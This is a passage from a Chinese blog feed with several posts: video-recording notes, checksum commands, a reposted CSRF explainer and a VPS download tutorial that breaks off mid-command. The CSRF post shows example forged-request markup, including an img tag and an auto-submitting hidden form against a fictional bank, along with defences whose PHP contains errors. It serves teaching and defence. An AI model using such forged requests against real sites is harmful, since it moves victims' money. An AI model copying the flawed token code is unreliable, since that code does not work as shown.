        <content type="html"><![CDATA[<p><embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=8679165&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></embed></p><a id="more"></a><hr><p>经过近一周的奋战，终于把去年8月就想录制的系统封装教程录制剪辑完毕了，现已上线：</p><p>Bilibili : <a href="http://www.bilibili.com/video/av8679165/" target="_blank" rel="noopener">http://www.bilibili.com/video/av8679165/</a></p><p>YouTube : <a href="https://www.youtube.com/watch?v=urmczmqsHn4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=urmczmqsHn4</a></p><p>在这个过程中，确实学到了不少，也折腾了不少，首先是距离上次封装已经有半年了，自己记忆模糊，然后是第一次录制，上来直接开录，导致推到两三次，最后就是Castasia、Premiere、After Effect等软件的使用，毕竟新手，用起来总是磕磕碰碰，所幸最终教程顺利上线，自己也总结一下本次的经验，以便今后参考：</p><ol><li>录制视频前，自己要先把录制的内容走一遍，尽可能使录制一气呵成。可以把录制内容拆分步骤，记录在旁边，减少出错。对于自己出现的问题在后期处理时重点标出</li><li>对于一些文字内容，可以适当放大屏幕来提高体验，这一点可以通过Premiere的效果控件中的缩放来实现</li><li>对于一些不必要的过程，可适当进行剪辑，倍速播放等</li><li>在整个录制过程中，耗时很多的几个步骤是：<ul><li>系统打补丁（近3小时）</li><li>镜像文件的保存（1小时左右）</li><li>wim转esd格式（2小时）</li><li>Castasia保存录制的原生视频（1小时）</li><li>Pr导出剪辑好的视频（1小时）</li></ul></li><li>本次录制使用了VMware封装、Castasia 9.0录屏、Premiere剪辑、After Effect添加字幕</li><li>在最后的上传中，由于YouTube强大的Content ID机制，我其中的一段背景音乐因为侵权而导致整个视频都被静音，最后移除该段音乐解决。<br><img src="http://ohx73ws1b.bkt.clouddn.com/YouTube%E9%9F%B3%E4%B9%90%E7%89%88%E6%9D%83.png" alt=""></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统封装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac和CentOS命令行下文件校验</title>
      <link href="/post/file-chek-on-terminal/"/>
      <url>/post/file-chek-on-terminal/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cn5iehl5j30he08xt9l.jpg" alt=""></p><a id="more"></a><p>　　你从互联网上下载了某个文件(比如安装程序、ISO映像文件或压缩文件)后，该文件可能因各种错误情形而遭到损坏，比如由于网络连接上的传输错误、下载受到中断、存储硬件有故障、文件系统错误等。抛开此类错误情形不说，文件还有可能被攻击者在下载过程中或下载前恶意篡改。比如说，攻击者对认证中心做手脚后，就能发动中间人(MITM)攻击，引诱你从假冒的HTTPS网站下载感染了恶意软件的文件。</p><p>　　为了保护自己远离这些种类的问题，你从互联网下载文件时，我们常常建议验证文件的真实性和完整性。尤其是你下载了相当敏感的文件(比如操作系统映像文件、应用程序二进制代码和可执行的安装程序等)后，盲目地相信已下载文件可不是一个好习惯。</p><p>在Mac平台下，你可以使用以下方式进行校验：</p><ol><li>MD5：<code>md5 filename</code></li><li>SHA1: <code>shasum filename</code></li><li>CRC32: <code>crc32 filename</code></li></ol><p>CentOS平台下则是：</p><ol><li>MD5: <code>md5sum filename</code></li><li>SHA1: <code>shasum filename</code></li></ol><p>是不是方便了很多呢？</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【转】浅谈CSRF攻击方式</title>
      <link href="/post/csrf-attack/"/>
      <url>/post/csrf-attack/</url>
      
        <content type="html"><![CDATA[<p>好久没更新了，hexo命令都要忘记了。。。</p><a id="more"></a><h3 id="一-CSRF是什么？"><a href="#一-CSRF是什么？" class="headerlink" title="一.CSRF是什么？"></a>一.CSRF是什么？</h3><p>　　CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p><h3 id="二-CSRF可以做什么？"><a href="#二-CSRF可以做什么？" class="headerlink" title="二.CSRF可以做什么？"></a>二.CSRF可以做什么？</h3><p>　　你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p><h3 id="三-CSRF漏洞现状"><a href="#三-CSRF漏洞现状" class="headerlink" title="三.CSRF漏洞现状"></a>三.CSRF漏洞现状</h3><p>　　CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站），YouTube和百度HI……而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。</p><h3 id="四-CSRF的原理"><a href="#四-CSRF的原理" class="headerlink" title="四.CSRF的原理"></a>四.CSRF的原理</h3><p>　　下图简单阐述了CSRF攻击的思想：</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/CRSF%E6%94%BB%E5%87%BB.jpg" alt="CSRF攻击"></p><p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><p>　　1. 登录受信任网站A，并在本地生成Cookie。</p><p>　　2. 在不登出A的情况下，访问危险网站B。</p><p>　　看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：</p><p>　　1. 你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p><p>　　2. 你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了……）</p><p>　　3. 上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</p><p>　　上面大概地讲了一下CSRF攻击的思想，下面我将用几个例子详细说说具体的CSRF攻击，这里我以一个银行转账的操作作为例子（仅仅是例子，真实的银行网站没这么傻:&gt;）</p><p>　　示例1：</p><p>　　银行网站A，它以GET请求来完成银行转账的操作，如：<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000" target="_blank" rel="noopener">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a></p><p>　　危险网站B，它里面有一段HTML的代码如下：</p><p>  <code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</code></p><p>  首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块……</p><p>　　为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源“<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作" target="_blank" rel="noopener">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作</a>……</p><p>　　示例2：</p><p>　　为了杜绝上面的问题，银行决定改用POST请求完成转账操作。</p><p>　　银行网站A的WEB表单如下：　　</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"Transfer.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">　   <span class="tag">&lt;<span class="name">p</span>&gt;</span>ToBankId: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">　   <span class="tag">&lt;<span class="name">p</span>&gt;</span>Money: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"money"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">　   <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Transfer"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   后台处理页面Transfer.php如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'toBankId'</span>] &amp;&amp;　<span class="keyword">isset</span>($_REQUEST[<span class="string">'money'</span>])) &#123;</span><br><span class="line">    buy_stocks($_REQUEST[<span class="string">'toBankId'</span>],　$_REQUEST[<span class="string">'money'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  危险网站B，仍然只是包含那句HTML代码：</p><p><code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</code></p><p>和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果…..和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了$_REQUEST去获取请求 的数据，而$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。</p><p>　　示例3：</p><p>　　经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用$_POST，只获取POST请求的数据，后台处理页面Transfer.php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'toBankId'</span>] &amp;&amp;　<span class="keyword">isset</span>($_POST[<span class="string">'money'</span>])) &#123;</span><br><span class="line">    buy_stocks($_POST[<span class="string">'toBankId'</span>],　$_POST[<span class="string">'money'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   然而，危险网站B与时俱进，它改了一下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">　　　　　　<span class="function"><span class="keyword">function</span> <span class="title">steal</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">     　　　　 iframe = <span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span></span><br><span class="line"><span class="actionscript">　　     　　 iframe.document.Submit(<span class="string">"transfer"</span>);</span></span><br><span class="line">　　　　　　&#125;</span><br><span class="line">　　　　<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">　　<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"steal()"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>　<span class="attr">action</span>=<span class="string">"http://www.myBank.com/Transfer.php"</span>&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> <span class="attr">value</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"1000"</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块……因为这里危险网站B暗地里发送了POST请求到银行!</p><p>　　总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个<img>就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。</p><p>　　理解上面的3种攻击模式，其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</p><h3 id="五-CSRF的防御"><a href="#五-CSRF的防御" class="headerlink" title="五.CSRF的防御"></a>五.CSRF的防御</h3><p>　　我总结了一下看到的资料，CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。</p><p>　　1. 服务端进行CSRF防御</p><p>　　服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。</p><p>　　(1).Cookie Hashing(所有表单都包含同一个伪随机值)：</p><p>　　这可能是最简单的解决方案了，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败了:&gt;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//构造加密的Cookie信息</span></span><br><span class="line">$value = “DefenseSCRF”;</span><br><span class="line">setcookie(”cookie”, $value, time()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><p>在表单里增加Hash值，以认证这确实是用户发送的请求。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>　$hash = md5($_COOKIE[<span class="string">'cookie'</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">”POST”</span> <span class="attr">action</span>=<span class="string">”transfer.php”</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">name</span>=<span class="string">”toBankId”</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">name</span>=<span class="string">”money”</span>&gt;</span></span><br><span class="line">　　&lt;input type=”hidden” name=”hash” value=”&lt;?=$hash;?&gt;”&gt;</span><br><span class="line">　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”submit”</span> <span class="attr">name</span>=<span class="string">”submit”</span> <span class="attr">value</span>=<span class="string">”Submit”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在服务器端进行Hash值验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'check'</span>])) &#123;</span><br><span class="line">     $hash = md5($_COOKIE[<span class="string">'cookie'</span>]);</span><br><span class="line">     <span class="keyword">if</span>($_POST[<span class="string">'check'</span>] == $hash) &#123;</span><br><span class="line">          doJob();</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">　　　　　　<span class="comment">//...</span></span><br><span class="line">     &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">　　　<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法个人觉得已经可以杜绝99%的CSRF攻击了，那还有1%呢….由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，这就另外的1%。一般的攻击者看到有需要算Hash值，基本都会放弃了，某些除外，所以如果需要100%的杜绝，这个不是最好的方法。<br>　　(2).验证码</p><p>　　这个方案的思路是：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，厄….这个方案可以完全解决CSRF，但个人觉得在易用性方面似乎不是太好，还有听闻是验证码图片的使用涉及了一个被称为MHTML的Bug，可能在某些版本的微软IE中受影响。</p><p>　　(3).One-Time Tokens(不同的表单包含一个不同的伪随机值)</p><p>　　在实现One-Time Tokens时，需要注意一点：就是“并行会话的兼容”。如果用户在一个站点上同时打开了两个不同的表单，CSRF保护措施不应该影响到他对任何表单的提交。考虑一下如果每次表单被装入时站点生成一个伪随机值来覆盖以前的伪随机值将会发生什么情况：用户只能成功地提交他最后打开的表单，因为所有其他的表单都含有非法的伪随机值。必须小心操作以确保CSRF保护措施不会影响选项卡式的浏览或者利用多个浏览器窗口浏览一个站点。</p><p>　　以下我的实现:</p><p>　　1).先是令牌生成函数(gen_token())：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">gen_token</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> 　　　　<span class="comment">//这里我是贪方便，实际上单使用Rand()得出的随机数作为令牌，也是不安全的。</span></span><br><span class="line">　　　　<span class="comment">//这个可以参考我写的Findbugs笔记中的《Random object created and used only once》</span></span><br><span class="line">          $token = md5(uniqid(rand(), <span class="keyword">true</span>));</span><br><span class="line">          <span class="keyword">return</span> $token;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>2).然后是Session令牌生成函数(gen_stoken())：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_stoken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     $pToken = <span class="string">""</span>;</span><br><span class="line">　　　<span class="keyword">if</span>($_SESSION[STOKEN_NAME]  == $pToken)&#123;</span><br><span class="line">　　　　　<span class="comment">//没有值，赋新值</span></span><br><span class="line">　　　　　$_SESSION[STOKEN_NAME] = gen_token();</span><br><span class="line">　　　&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">　　　　　<span class="comment">//继续使用旧的值</span></span><br><span class="line">　　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3).WEB表单生成隐藏输入域的函数：　　</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">gen_input</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          gen_stoken();</span><br><span class="line">          <span class="keyword">echo</span> “&lt;input type=\”hidden\” name=\”<span class="string">" . FTOKEN_NAME . “\”</span></span><br><span class="line"><span class="string">               value=\”"</span> . $_SESSION[STOKEN_NAME] . “\”&gt; “;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>4).WEB表单结构：</p><pre><code class="html"><span class="php"><span class="meta">&lt;?php</span></span><span class="php">     session_start();</span><span class="php">     <span class="keyword">include</span>(<span class="string">'functions.php'</span>);</span><span class="php"><span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">”POST”</span> <span class="attr">action</span>=<span class="string">”transfer.php”</span>&gt;</span>     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">name</span>=<span class="string">”toBankId”</span>&gt;</span>     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">name</span>=<span class="string">”money”</span>&gt;</span>     <span class="php"><span class="meta">&lt;?</span> gen_input(); <span class="meta">?&gt;</span></span>     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”submit”</span> <span class="attr">name</span>=<span class="string">”submit”</span> <span class="attr">value</span>=<span class="string">”Submit”</span>&gt;</span><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></code></pre><p>5).服务端核对令牌：</p><p>　　这个很简单，这里就不再啰嗦了。</p><p>　　上面这个其实不完全符合“并行会话的兼容”的规则，大家可以在此基础上修改。</p><hr><p>文章转载自：<a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPS离线下载之二</title>
      <link href="/post/vps-download-part-II/"/>
      <url>/post/vps-download-part-II/</url>
      
        <content type="html"><![CDATA[<p>解决VPS下载好的文件如何同步到百度云的问题。</p><a id="more"></a><p>现在我们已经将文件下载到我们的vps了，但怎么取回本地呢？</p><p>楼主首先尝试的是用wget命令下载到服务器，然后用FTP取回本地，后来测试发现FTP在同一时间、同一个文件上传在500KB/，下载最高50KB/，这也太鸡肋了，一番Google后发现可以使用<a href="https://github.com/houtianze/bypy" target="_blank" rel="noopener">Bypy</a>同步到百度云。</p><p>关于同步到百度云，由于已经有博主写了一篇很好的文章，我就全文转载了。</p><blockquote><p>前一段时间接了个小任务，要把YouTube上的几百个视频下载回来，用百度云网盘分享给公司的同事供学习使用。</p><p>当老板发邮件问我这事儿是否能办时，我很快就回复说没问题，因为“从YouTube下载视频”这种事之前我也不是没做过。网上有一大批在线工具能够嗅探出YouTube视频的下载链接，然后直接用常规手段（迅雷啥的）下载就可以了。本地下载工具也不少，如著名的IDM就能够直接下载网页上嵌套的视频文件，几乎是万能的。不过，这次的任务有点复杂：一来要下载的文件太多了，我总不能重复操作几百次来下载每个视频吧；二来，还得上传到百度云，这么多视频，靠我家里那小水管，没个几天几夜恐怕是上传不完的，多费劲呀。</p><p>然后我就开始琢磨这件事能不能更自动化、更高效一些来实现。呃，放狗上Google搜了一下，找到了几个大杀器，参考了一下各位大神的教程后，我也拼凑出了一个解决方案。</p><p>长话短说：</p><p>在美国VPS上安装YouTube专用下载工具，远程下载想要的YouTube视频到服务器上；在VPS上安装百度云网盘上传工具，将已经下载到VPS中的视频上传到云端。</p><p>这个方案的好处很明显：用位于美国的VPS下载本身服务器就在美国的YouTbe网站视频，速度相当快（实测可以超过60MB/s）。从美国VPS上传文件到百度云，速度虽然受限（一般是几百Kb每秒，偶见超过1MB/s的），但仍比我在国内本地的上传网速要快得多。更重要的是，这个方案是高度自动化、批量进行的，不用手动对付每个视频。</p><p>短话长说：</p><p>接下来要写的详细教程，是一个大杂烩。你在网上能找到的特定教程，都是有特定限制条件的，例如你的VPS用的是啥操作系统，你要实现多大程度的自动化，等等。在完成这个教程的过程中，我也踩了不少坑，幸亏有万能的Google相助。</p><h2 id="1-安装VPS操作系统"><a href="#1-安装VPS操作系统" class="headerlink" title="1 安装VPS操作系统"></a>1 安装VPS操作系统</h2><p>我用的是DigitalOcean（若使用我的推荐链接注册DigitalOcean，您的账户可以立即获得10美金，相当于免费获得两个月的使用权）最基础的套餐，每月5$，20G的SSD储存空间，1T流量。安装的操作系统是CentOS 7（请注意操作系统的选择，这很重要，后面我会提到原因），节点为旧金山（据说从大陆访问会比较快）。所以，如果你也是DO用户的话，可以完全照我这篇教程来做，准没问题。不是的话，请酌情参考就好了，其他问题我不负责解答哈，毕竟，我是一个伪技术流……</p><p>首先要赞下DigitalOcean的VPS用起来真是方便，点几下鼠标就能创建好一台服务器。理论上用SSH密钥登录会更安全，不过我偷懒，只是简单用LastPass生成一个几十位长度的随机密码，需要用到就复制粘贴一下好了（请大家不要向我学习……）。禁用root账号登录，修改SSH端口号什么的，这些安全措施也可以做下，我就不多说了，不太清楚的话请自行Google。</p><p>前面提过VPS的操作系统问题，为啥我用CentOS 7呢？因为这个版本默认自带的Python是2.7.5（截至本文发布时是这样的），而这个教程中会用到的百度云网盘Linux客户端（bypy）依赖的Python版本号为2.7x。一开始我装了个CentOS 6，其自带Python 6.x，不符合要求；Google了好多教程，还是没能装上Python 2.7x（在DO的这个系统上需要自行编译Python，各种报错很无奈）；最后决定放弃CentOS 6，换成7，因为有那个工夫折腾Python，我还不如去看几集美剧是吧，呃，好像我又无意中暴露了什么……</p><h2 id="2-安装youtube-dl"><a href="#2-安装youtube-dl" class="headerlink" title="2 安装youtube-dl"></a>2 安装youtube-dl</h2><p>传说中的第一个大杀器终于粗线了：youtube-dl。这个工具可以用来下载一系列国外网站的在线视频，如油管家的。它既有本地客户端，也可以被部署在服务器上。</p><p>用Putty登入VPS后，依次执行以下两条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget https://yt-dl.org/downloads/latest/youtube-dl -O /usr/<span class="built_in">local</span>/bin/youtube-dl</span><br><span class="line">&gt;chmod a+rx /usr/<span class="built_in">local</span>/bin/youtube-dl</span><br></pre></td></tr></table></figure><p>然后就没了。是的就是这么简单，现在你已经装完youtube-dl，可以在VPS上远程下载指定的YouTube视频了。</p><p>最简单的命令如下：</p><p><code>youtube-dl video-url</code></p><p>把上面的这个video-url换成具体某个YouTube视频的URL就可以直接下载了。注意，youtube-dl会默认下载视频到当前执行命令的目录下。</p><p>YouTube有Playlist功能，即播放列表，你可以用Google账号登录，然后就可以把若干视频添加保存到Playlist。如果你想要批量下载某个Playlist的视频，就可以把前面那条下载命令中的 video-url换成具体Playlist的链接。话句话说，想要一次下载多个YouTube视频，你可以考虑用这个Playlist功能。</p><p>不过呢，像本文开头提到的这个任务，如果我要手动添加几百个视频到Playlist那得累到手抽筋：我得先点开每一个视频的具体链接，然后再点两下鼠标才能将之添加进Playlist。好了不绕弯了，说这么多，就是想烘托出youtube-dl的另一个激动人心的功能：支持读取下载链接列表文件。这意味着我可以先把所有下载链接整理好后放进一个txt文件，然后让youtube-dl去读取这个txt文件就行了，接下来它就会自动下载全部的视频。该方法的命令如下：</p><p><code>youtube-dl -a video_url.txt</code></p><p>这里的 -a 参数表示读取外部链接文件。</p><p>具体细节操作在后面会提到，请耐心往下看……</p><h2 id="3-安装byby"><a href="#3-安装byby" class="headerlink" title="3 安装byby"></a>3 安装byby</h2><p>Byby是一个百度云网盘的Python客户端，可在Linux环境下通过命令行来操作。</p><p>在本文的操作环境下，安装byby需要更多的步骤，byby官网没有介绍那么详细，所以我参考了其他网友的教程。</p><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p><code>yum install git</code></p><h3 id="安装Python-Pip"><a href="#安装Python-Pip" class="headerlink" title="安装Python Pip"></a>安装Python Pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;yum -y install 